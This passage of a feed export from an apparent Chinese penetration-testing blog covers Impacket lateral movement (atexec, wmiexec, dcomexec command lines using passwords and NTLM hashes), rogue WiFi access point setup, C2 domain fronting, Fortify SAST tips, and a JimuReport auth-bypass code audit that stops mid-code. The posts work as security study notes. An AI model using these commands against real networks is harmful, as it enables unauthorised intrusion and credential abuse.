href="https://zhida.zhihu.com/search?q=%E8%BF%9C%E7%A8%8B%E6%B3%A8%E5%86%8C%E8%A1%A8&zhida_source=entity&is_preview=1">远程注册表</a>和文件系统协议，而是通过XML来指定任务的配置。</p><p>该三个接口在Impacket中均有实现</p></blockquote><h4 id="工具-2"><a href="#工具-2" class="headerlink" title="工具"></a>工具</h4><p>与smbexec类似</p><p>明文和哈希值均可传递，并且连接后自动提权</p><p>atexec是通过windows计划任务执行远程命令，atexec是一个半交互的工具，即参数中添加需要在远程主机执行的命令，工具执行后即返回命令结果，适用于webshell下，也适用于其他网络环境。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot; # 本地用户明文连接执行命令</span><br><span class="line">atexec.exe god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot; #域内用户明文连接执行命令</span><br><span class="line"></span><br><span class="line">atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot; # 使用hash进行本地用户连接</span><br><span class="line">atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 &quot;whoami&quot; # 使用hash进行域内用户连接</span><br></pre></td></tr></table></figure><h3 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h3><h4 id="项目-1"><a href="#项目-1" class="headerlink" title="项目"></a>项目</h4><p><a href="https://github.com/rootclay/WMIHACKER">https://github.com/rootclay/WMIHACKER</a></p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1、远程主机的WMI服务为开启状态（默认开启）<br>2、远程主机防火墙放行135端口，这是WMI管理的默认端口</p><p>内网中，由于大多数 Windows 系统自带 wmic 命令， 所以 WMIC 是内网横向的常用方法之一，使用 WMI 的前置要求是，<strong>目标端口开放 135 端口，且允许随机一个高位端口进行通信</strong>。这是由于 WMI 是先通过 135 端口建立连接，而后通过随机的高位端口进行数据传输。</p><p>直接使用系统自带的 WMIC 进行连接，执行命令是无回显的，常常需要将执行的返回结果写入文件，再通过文件读取的方式将回显带回来。</p><h4 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h4><p>全称是Windows management instrumentation，它出现在所有的Windows操作系统中，并由一组强大的工具集合组成，用于管理本地或远程的Windows系统，攻击者使用wmi来进行攻击，但Windows系统默认不会再日志中记录这些操作，可以做到无日志，攻击脚本无需写入到磁盘，增加了隐蔽性。推荐使用wmiexec进行远程执行命令</p><h4 id="wmiexec-1"><a href="#wmiexec-1" class="headerlink" title="wmiexec"></a>wmiexec</h4><p>大牛使用VBS脚本调用WMI来模拟 psexec 的功能，于是乎WMIEXEC 就诞生了。基本上psexec 能用的地方，这个脚本也能够使用。整个过程是先调用WMI通过账号密码或者NTLM认证（WCE注入）连接到远程计算机，然后如果提供了账号密码，则用这个账号密码建立一个到目标的IPC连接。随后WMI会建立一个共享文件夹，用于远程读取命令执行结果。 当用户输入命令时，WMI创建进程执行该命令，然后把结果输出到文件，这个文件位于之前创建的共享文件夹中。最后，通过FSO组件访问远程共享文件夹中的结果文件，将结果输出。当结果读取完成时，调用WMI执行命令删除结果文件。最后当WMIEXEC退出时，删除文件共享</p><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p><strong>wmiexec.py</strong></p><p>首先是 impacket 工具包里的 wmiexec.py。提供了通过 wmi 执行命令并回显的功能。其原理较为简单：通过 wmi 执行命令，并将执行结果保存文件，通过 smb 读取返回结果。如下是 wmiexec.py 的一个片段，其中 <strong>__output</strong> 为输出的临时文件， <strong>__transferClient</strong> 为 smb 的连接。所以，该工具的使用条件是需要 445、135 和高位随机的一个端口都允许通信。</p><p>wmiexec.py 还支持无回显的方式进行命令执行。这种方式是不会建立 SMB 连接，也就不需要 445 端口的开放。</p><p><strong>WMICMD</strong></p><p><strong>WMICMD</strong> 的实现原理和 <strong>wmiexec.py</strong> 有些出入。上面介绍了 <strong>WMICMD</strong> 之所以能得到回显的原因，是借助了 445 端口的 SMB 连接。而 <strong>WMICMD</strong> 能够做到不需要 445 端口就可以完成命令执行并回显。其原理是通过命令执行将执行结果写入注册表之中，再通过 WMI 对注册表进行操作，读取结果，这样一来就不需要 445 端口了。如下是 <strong>WMICMD</strong> 通过注册表获取执行结果回显的代码片段。</p><p><strong>WMIHACKER</strong></p><p><strong>WMIHACKER</strong> 也是通过将命令执行将执行结果写入到注册表，但不一样的地方是 <strong>wmiexe.py</strong> 和 <strong>wmicmd</strong> 是通过创建一个 win32Process 进程来执行命令，而 <strong>WMIHACKER</strong> 是使用<strong>事件触发器来调用 VB 代码</strong>，达到命令执行的效果。根据介绍，这种方式在当时可以绕过杀软。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py uf9n1x/Administrator:123qwe@@192.168.1.131 </span><br><span class="line"></span><br><span class="line">wmiexec.exe ./administrator:123qwe@@192.168.1.131 &quot;whoami&quot; </span><br><span class="line">wmiexec.exe god/administrator:Admin12345@192.168.1.131 &quot;whoami&quot; </span><br><span class="line">wmiexec.exe -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.1.131 &quot;whoami&quot; </span><br><span class="line">wmiexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 uf9n1x/administrator@192.168.1.131 &quot;whoami&quot;</span><br><span class="line"></span><br><span class="line">cscript //nologo wmiexec.vbs /shell 192.168.1.131 administrator 123qwe@</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wmic /node:192.168.1.131 /user:administrator /password:123qwe@ process call create &quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Refer-2"><a href="#Refer-2" class="headerlink" title="Refer"></a>Refer</h4><p><a href="https://cloud.tencent.com/developer/article/1895804">https://cloud.tencent.com/developer/article/1895804</a></p><h3 id="dcomexec"><a href="#dcomexec" class="headerlink" title="dcomexec"></a>dcomexec</h3><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><h5 id="COM"><a href="#COM" class="headerlink" title="COM"></a>COM</h5><p>COM即组件对象模型(Component Object Model，COM) ，是基于 Windows 平台的一套<strong>组件对象接口标准</strong>，由一组<strong>构造规范</strong>和<strong>组件对象库</strong>组成。COM是许多微软产品和技术，如Windows媒体播放器和Windows Server的基础。</p><p>一般的对象是由数据成员和作用在其上的方法组成，而组件对象和一般对象虽有相似性，但又有较大不同。组件对象不使用方法而用接口来描述自身。接口被定义为“在对象上实现的一组语义上相关的功能”，其实质是一组函数指针表，每个指针必须初始化指向某个具体的函数体，一个组件对象实现的接口数量没有限制。</p><p>Windows COM（Component Object Model，组件对象模型）是微软开发的一种软件架构，它允许应用程序的组件以对象的形式进行交互。COM 定义了一种标准，这种标准与编程语言无关，并且可以使组件在进程内或跨进程（甚至跨网络）进行通信。这意味着开发者可以使用任何支持 COM 的编程语言来创建或使用 COM 组件。</p><h5 id="DCOM"><a href="#DCOM" class="headerlink" title="DCOM"></a>DCOM</h5><p>DCOM（分布式组件对象模型）是微软基于组件对象模型（COM）的一系列概念和程序接口，它支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是Internet上。利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求。</p><blockquote><p>DCOM是COM（组件对象模型）的扩展，它允许应用程序实例化和访问远程计算机上COM对象的属性和方法。DCOM 使用远程过程调用（RPC）技术将组件对象模型（COM）的功能扩展到本地计算机之外，因此，在远程系统上托管COM服务器端的软件（通常在DLL或exe中）可以通过RPC向客户端公开其方法。</p></blockquote><p>攻击者可使用 DCOM 进行横向移动，通过 DCOM，攻击者可在拥有适当权限的情况下通过 Office 应用程序以及包含不安全方法的其他 Windows 对象远程执行命令。</p><p>使用DCOM进行横向移动的优势之一在于，<strong>在远程主机上执行的进程将会是托管COM服务器端的软件</strong>。例如我们滥用ShellBrowserWindow COM对象，那么就会在远程主机的现有explorer.exe进程中执行。对攻击者而言，这无疑能够增强隐蔽性，由于有大量程序都会向DCOM公开方法，因此防御者可能难以全面监测所有程序的执行。</p><h4 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h4><p>类似wmiexec.py的半交互式Shell，但是使用了DCOM接口，目前支持的接口有<code>MMC20.Application</code>、<code>ShellWindows</code>、<code>ShellBrowserWindows</code></p><h4 id="工具-3"><a href="#工具-3" class="headerlink" title="工具"></a>工具</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./dcomexec.py domain/username:password@ip</span><br><span class="line">./dcomexec.py domain/username:password@ip &lt;command&gt;</span><br></pre></td></tr></table></figure><p>powershell</p><h4 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h4><p><a href="https://www.freebuf.com/articles/network/261454.html">https://www.freebuf.com/articles/network/261454.html</a></p><p><a href="https://xz.aliyun.com/t/9691?time__1311=n4+xnD0DuDRDgD02DhD/ia4BKK0KKhR+qq+FID">https://xz.aliyun.com/t/9691?time__1311=n4%2BxnD0DuDRDgD02DhD%2Fia4BKK0KKhR%2Bqq%2BFID</a></p>]]></content>
    
    
    <summary type="html">Impacket横向移动工具使用及原理</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>ToDesk渗透利用备忘</title>
    <link href="http://example.com/posts/1746513925.html"/>
    <id>http://example.com/posts/1746513925.html</id>
    <published>2024-08-22T15:44:31.000Z</published>
    <updated>2024-10-25T07:09:20.695Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ToDesk渗透利用备忘"><a href="#ToDesk渗透利用备忘" class="headerlink" title="ToDesk渗透利用备忘"></a>ToDesk渗透利用备忘</h1>]]></content>
    
    
    <summary type="html">ToDesk渗透利用备忘</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>SAST代审工具Fority进阶使用</title>
    <link href="http://example.com/posts/1678792201.html"/>
    <id>http://example.com/posts/1678792201.html</id>
    <published>2024-08-22T13:23:49.000Z</published>
    <updated>2024-10-25T07:09:20.696Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SAST代审工具Fority进阶使用"><a href="#SAST代审工具Fority进阶使用" class="headerlink" title="SAST代审工具Fority进阶使用"></a>SAST代审工具Fority进阶使用</h1><h2 id="去除扫描静态文件"><a href="#去除扫描静态文件" class="headerlink" title="去除扫描静态文件"></a>去除扫描静态文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\Fortify\Core\config\fortify-sca.properties</span><br></pre></td></tr></table></figure><p>找到com.fortify.sca.DefaultFileTypes行 进行去除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jsp jspx jspf html js</span><br></pre></td></tr></table></figure><h2 id="扫描maven项目"><a href="#扫描maven项目" class="headerlink" title="扫描maven项目"></a>扫描maven项目</h2><p>refer：<a href="https://anemone.top/whitebox-Fortify%E4%BD%BF%E7%94%A8%E5%88%9D%E6%8E%A2/">https://anemone.top/whitebox-Fortify%E4%BD%BF%E7%94%A8%E5%88%9D%E6%8E%A2/</a></p><p>若为maven项目，先在<code>.../Fortify/Fortify_SCA_and_Apps_&#123;version&#125;/plugins/maven</code>文件夹下找到<code>maven-plugin-bin.zip</code>解压，然后<code>maven clean install</code>安装到本地仓库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unzip maven-plugin-bin.zip -d /tmp/maven-plugin-bin</span><br><span class="line">cd /tmp/maven-plugin-bin</span><br><span class="line">./install.sh # win为install.bat</span><br></pre></td></tr></table></figure><p>然后在用ScanWizard时第二步，勾选Maven，再简单配置一下maven即可</p><p>maven扫描测试WebGoat</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fortify_Apps_and_Tools_23.2.0\bin\auditworkbench.cmd</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">SAST代审工具Fority进阶使用</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>WIFI近源渗透</title>
    <link href="http://example.com/posts/2334844774.html"/>
    <id>http://example.com/posts/2334844774.html</id>
    <published>2024-08-15T14:41:00.000Z</published>
    <updated>2024-10-25T07:09:20.697Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/Lmg66/p/13499019.html">https://www.cnblogs.com/Lmg66/p/13499019.html</a></p><p><a href="https://mp.weixin.qq.com/s/tD4GMool6D2dA_UTsMt0nw">https://mp.weixin.qq.com/s/tD4GMool6D2dA_UTsMt0nw</a></p><p><a href="https://unsafe.sh/go-72576.html">https://unsafe.sh/go-72576.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#设置无线网卡</span><br><span class="line">set interface wlan0</span><br><span class="line">#设置无线网信号</span><br><span class="line">set ssid test</span><br><span class="line">#设置插件</span><br><span class="line">set proxy noproxy</span><br><span class="line">#开启dns转发</span><br><span class="line">ignore pydns_server</span><br><span class="line">#开始攻击</span><br><span class="line">start</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set interface wlan0</span><br><span class="line">set ssid School</span><br><span class="line">set proxy captiveflask</span><br><span class="line">set captiveflask.School true</span><br><span class="line">proxies</span><br><span class="line">start</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/data/local/nhsystem/kali-arm64/root/dirsearch</span><br><span class="line"></span><br><span class="line">adb push fscan /data/local/nhsystem/kali-arm64/root/fscan</span><br><span class="line">adb push fscan /data/local/nhsystem/kali-arm64/home/kali/fscan</span><br></pre></td></tr></table></figure><p><a href="https://cn-sec.com/archives/201918.html">https://cn-sec.com/archives/201918.html</a></p>]]></content>
    
    
    <summary type="html">WIFI近源渗透</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>C2隐藏技术域前置https</title>
    <link href="http://example.com/posts/4158604045.html"/>
    <id>http://example.com/posts/4158604045.html</id>
    <published>2024-08-15T03:01:27.000Z</published>
    <updated>2024-10-25T07:09:20.688Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C2隐藏技术域前置https"><a href="#C2隐藏技术域前置https" class="headerlink" title="C2隐藏技术域前置https"></a>C2隐藏技术域前置https</h1><p>准备工作：</p><p>VPS 1台</p><p>免备案域名（）</p><p>CDN</p><p>refer：<a href="https://xz.aliyun.com/t/12624?time__1311=GqGxuD2DgAq7qGN4exUxYw2EYHi=tYDnAioD">https://xz.aliyun.com/t/12624?time__1311=GqGxuD2DgAq7qGN4exUxYw2EYHi%3DtYDnAioD</a></p><p><img src="/C2%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E5%9F%9F%E5%89%8D%E7%BD%AEhttps.assets/image-20240815111523696.png" alt="image-20240815111523696"></p><p><img src="/C2%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E5%9F%9F%E5%89%8D%E7%BD%AEhttps.assets/image-20240815111624949.png" alt="image-20240815111624949"><img src="/C2%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E5%9F%9F%E5%89%8D%E7%BD%AEhttps.assets/image-20240815111854024.png" alt="image-20240815111854024"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -type=CNAME www.aabysszg.cyou</span><br></pre></td></tr></table></figure><p><img src="/C2%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E5%9F%9F%E5%89%8D%E7%BD%AEhttps.assets/image-20240815112435193.png" alt="image-20240815112435193"></p><p><img src="/C2%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E5%9F%9F%E5%89%8D%E7%BD%AEhttps.assets/image-20240815112424349.png" alt="image-20240815112424349"></p><p><img src="/C2%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E5%9F%9F%E5%89%8D%E7%BD%AEhttps.assets/image-20240815112702166.png" alt="image-20240815112702166"></p><p><img src="/C2%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E5%9F%9F%E5%89%8D%E7%BD%AEhttps.assets/image-20240815112751551.png" alt="image-20240815112751551"></p>]]></content>
    
    
    <summary type="html">C2隐藏技术域前置https</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>IDEA审计全局搜索Maven依赖Jar包</title>
    <link href="http://example.com/posts/2134961756.html"/>
    <id>http://example.com/posts/2134961756.html</id>
    <published>2024-08-09T09:24:19.000Z</published>
    <updated>2024-10-25T07:09:20.689Z</updated>
    
    <content type="html"><![CDATA[<h1 id="IDEA审计全局搜索Maven依赖Jar包"><a href="#IDEA审计全局搜索Maven依赖Jar包" class="headerlink" title="IDEA审计全局搜索Maven依赖Jar包"></a>IDEA审计全局搜索Maven依赖Jar包</h1><p>refer：<a href="https://www.cnblogs.com/Chary/p/17932200.html">https://www.cnblogs.com/Chary/p/17932200.html</a></p><h2 id="Jar包源码下载"><a href="#Jar包源码下载" class="headerlink" title="Jar包源码下载"></a>Jar包源码下载</h2><p>搜索Jar包内容需要把Jar包源码下载下来</p><p><img src="/IDEA%E5%AE%A1%E8%AE%A1%E5%85%A8%E5%B1%80%E6%90%9C%E7%B4%A2Maven%E4%BE%9D%E8%B5%96Jar%E5%8C%85.assets/image-20240809172633194.png" alt="image-20240809172633194"></p><img src="IDEA审计全局搜索Maven依赖Jar包.assets/image-20240809172723084.png" alt="image-20240809172723084" style="zoom:67%;" /><h2 id="内容搜索"><a href="#内容搜索" class="headerlink" title="内容搜索"></a>内容搜索</h2><h3 id="类名搜索"><a href="#类名搜索" class="headerlink" title="类名搜索"></a>类名搜索</h3><p>双击shift</p><img src="IDEA审计全局搜索Maven依赖Jar包.assets/image-20240809172851500.png" alt="image-20240809172851500" style="zoom:67%;" /><h3 id="文件内容搜索"><a href="#文件内容搜索" class="headerlink" title="文件内容搜索"></a>文件内容搜索</h3><p>shift+ctrl+F</p>]]></content>
    
    
    <summary type="html">IDEA审计全局搜索Maven依赖Jar包</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>jeecg-boot框架RCE0day代码审计</title>
    <link href="http://example.com/posts/2056780894.html"/>
    <id>http://example.com/posts/2056780894.html</id>
    <published>2024-08-07T06:39:28.000Z</published>
    <updated>2024-10-25T07:09:20.709Z</updated>
    
    <content type="html"><![CDATA[<h1 id="jeecg-boot框架RCE0day代码审计"><a href="#jeecg-boot框架RCE0day代码审计" class="headerlink" title="jeecg-boot框架RCE0day代码审计"></a>jeecg-boot框架RCE0day代码审计</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://github.com/jeecgboot/JimuReport/tree/master/jimureport-example">https://github.com/jeecgboot/JimuReport/tree/master/jimureport-example</a></p><p>refer：</p><p><a href="https://github.com/jeecgboot/JimuReport/issues/2848">https://github.com/jeecgboot/JimuReport/issues/2848</a></p><p><a href="https://github.com/jeecgboot/JimuReport/issues/2865">https://github.com/jeecgboot/JimuReport/issues/2865</a></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="Jimureport权限绕过漏洞"><a href="#Jimureport权限绕过漏洞" class="headerlink" title="Jimureport权限绕过漏洞"></a>Jimureport权限绕过漏洞</h2><p>权限绕过漏洞的关键部分（处理token）</p><p>org.jeecg.modules.jmreport.config.firewall.interceptor.JimuReportTokenInterceptor#preHandle</p><p><img src="/jeecg-boot%E6%A1%86%E6%9E%B6RCE0day%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240812194741002.png" alt="image-20240812194741002"></p><p>preHandle代码部分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(handler <span class="keyword">instanceof</span> HandlerMethod)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> d.i(request.getRequestURI().substring(request.getContextPath().length()));</span><br><span class="line">            log.debug(<span class="string">&quot;JimuReportInterceptor check requestPath = &quot;</span> + var4);</span><br><span class="line">            <span class="type">int</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="number">500</span>;</span><br><span class="line">            <span class="keyword">if</span> (n.a(var4)) &#123;</span><br><span class="line">                log.error(<span class="string">&quot;请注意，请求地址有xss攻击风险！&quot;</span> + var4);</span><br><span class="line">                <span class="built_in">this</span>.backError(response, <span class="string">&quot;请求地址有xss攻击风险!&quot;</span>, var5);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">this</span>.jmBaseConfig.getCustomPrePath();</span><br><span class="line">                log.debug(<span class="string">&quot;customPrePath: &#123;&#125;&quot;</span>, var6);</span><br><span class="line">                <span class="keyword">if</span> (j.d(var6) &amp;&amp; !var6.startsWith(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">                    var6 = <span class="string">&quot;/&quot;</span> + var6;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                request.setAttribute(<span class="string">&quot;customPrePath&quot;</span>, var6);</span><br><span class="line">                <span class="type">HandlerMethod</span> <span class="variable">var7</span> <span class="operator">=</span> (HandlerMethod)handler;</span><br><span class="line">                <span class="type">Method</span> <span class="variable">var8</span> <span class="operator">=</span> var7.getMethod();</span><br><span class="line">                <span class="keyword">if</span> (var4.contains(<span class="string">&quot;/jmreport/shareView/&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">JimuNoLoginRequired</span> <span class="variable">var9</span> <span class="operator">=</span> (JimuNoLoginRequired)var8.getAnnotation(JimuNoLoginRequired.class);</span><br><span class="line">                    <span class="keyword">if</span> (j.d(var9)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="type">boolean</span> <span class="variable">var10</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            var10 = <span class="built_in">this</span>.verifyToken(request);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception var14) &#123;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (!var10) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (<span class="built_in">this</span>.jimuReportShareService.isSharingEffective(var4, request)) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="type">String</span> <span class="variable">var16</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;previousPage&quot;</span>);</span><br><span class="line">                                <span class="keyword">if</span> (j.d(var16)) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="built_in">this</span>.jimuReportShareService.isShareingToken(var4, request)) &#123;</span><br><span class="line">                                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                        log.error(<span class="string">&quot;分享链接失效或分享token不匹配(&quot;</span> + request.getMethod() + <span class="string">&quot;)：&quot;</span> + var4);</span><br><span class="line">                                        <span class="built_in">this</span>.backError(response, <span class="string">&quot;分享链接失效或分享token不匹配，禁止钻取!&quot;</span>, var5);</span><br><span class="line">                                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    log.error(<span class="string">&quot;Token校验失败！请求无权限(&quot;</span> + request.getMethod() + <span class="string">&quot;)：&quot;</span> + var4);</span><br><span class="line">                                    <span class="built_in">this</span>.backError(response, <span class="string">&quot;Token校验失败，无权限访问！&quot;</span>, var5);</span><br><span class="line">                                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="type">b</span> <span class="variable">var15</span> <span class="operator">=</span> (b)var8.getAnnotation(b.class);</span><br><span class="line">                            <span class="keyword">if</span> (var15 != <span class="literal">null</span>) &#123;</span><br><span class="line">                                String[] var11 = var15.a();</span><br><span class="line">                                String[] var12 = <span class="built_in">this</span>.jimuTokenClient.getRoles(request);</span><br><span class="line">                                <span class="keyword">if</span> (var12 == <span class="literal">null</span> || var12.length == <span class="number">0</span>) &#123;</span><br><span class="line">                                    log.error(<span class="string">&quot;此接口需要角色权限，请联系管理员！请求无权限(&quot;</span> + request.getMethod() + <span class="string">&quot;)：&quot;</span> + var4);</span><br><span class="line">                                    <span class="keyword">if</span> (<span 